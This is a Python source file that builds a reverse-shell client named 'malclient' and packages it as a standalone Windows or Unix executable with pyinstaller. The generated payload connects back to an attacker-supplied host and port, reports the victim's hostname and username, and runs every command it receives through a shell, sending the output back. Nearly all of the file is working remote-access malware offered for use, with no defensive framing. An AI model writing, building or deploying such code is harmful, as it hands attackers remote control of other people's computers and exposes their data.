import os, shutil

# Function to delete the files and directories
def remove_paths(paths):
    print("[*] Performing Clean-Up. . .")
    for path in paths:
        if os.path.isdir(path):  # If it's a directory
            try:
                shutil.rmtree(path)  # Remove the entire directory and its contents
                print(f"Directory {path} has been deleted.")
            except Exception as e:
                print(f"Error deleting directory {path}: {e}")
        elif os.path.isfile(path):  # If it's a file
            try:
                os.remove(path)  # Remove the file
                print(f"File {path} has been deleted.")
            except Exception as e:
                print(f"Error deleting file {path}: {e}")
        else:
            print(f"Path {path} does not exist or is not a valid file/directory.")

def MoveExecutable(osTarget:str, unixPorts):
    # run a system command to run pyinstaller
    os.system('pyinstaller --onefile malclient.py')

    if osTarget.lower() not in unixPorts:
        shutil.move("dist/malclient.exe", ".")
        print("[+] Created malclient.exe! (Windows Executable)")
    else:
        shutil.move("dist/malclient", ".")
        print("[+] Created malclient! (Unix Executable)")

def CreateScript(lhost:str,lport:str,osTarget:str):
    # create target lists
    unixPorts = ["unix", "linux"]
    winPorts = ["windows", "win", "nt"]

    # create mass list
    validTargets = unixPorts + winPorts

    if osTarget.lower() not in validTargets:
        print(f"[-] {osTarget.lower()} is not a valid target OS")
        return False
    
    baseScript = f"""import socket,threading,subprocess,os

CONNECTIONENDED = True
sysInfo = ""

def ListenToServer(server):
    global CONNECTIONENDED,sysInfo
    sent = False
    try:
        while CONNECTIONENDED:
            recvBuffer = server.recv(4096).decode()
            if recvBuffer == \"\\n\":
                if sent == False:
                    server.sendall(sysInfo.encode())
                    sent = True
            elif recvBuffer == \"dtor\":
                CONNECTIONENDED = False
                server.close()
            resproc = subprocess.run(recvBuffer, text=True, capture_output=True, shell=True)
            res = recvBuffer + str(resproc.stdout)
            server.sendall(res.encode())
    except Exception as e:
        CONNECTIONENDED = False
        print(f\"Client Error: {{e}}\")
        server.close()

def StartClient():
    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    global CONNECTIONENDED,sysInfo

    try:
        clientsocket.connect((\"{lhost}\", {lport}))

        # Send system info
        if os.name == 'nt':
            sysInfo = \"{{\\\"os\\\":\\\"Windows\\\",\\\"user\\\":{{\\\"\\\\" + subprocess.check_output('whoami', text=True).strip() + \"\\"}}\" + \"}}\"
        elif os.name == 'posix':
            sysInfo = \"{{\\\"os\\\":\\\"Windows\\\",\\\"user\\\":{{\\\"\\\\" + subprocess.check_output(['echo \\\"$(hostname)\\$(whoami)\\\"'], text=True).strip() + \"\\"}}\" + \"}}\"

        # Turn on listener
        serverListener = threading.Thread(target=ListenToServer, args=[clientsocket])
        serverListener.start()

        serverListener.join()

    except Exception as e:
        CONNECTIONENDED = False
        print(f\"Client Connect Error: {{e}}\")
        clientsocket.close()

def main():
    StartClient()
    print(\"Program Ended\")

if __name__ == "__main__":
    main()
"""
    with open('malclient.py', 'w') as MalScript:
        MalScript.write(baseScript)

    print(f"[+] Created malclient.py")
    print("[*] Building portable executable. . .")

    remove_paths(['malclient', 'malclient.exe', 'malclient.spec'])
    MoveExecutable(osTarget,unixPorts)
    remove_paths(['__pycache__', 'build', 'dist'])

    return True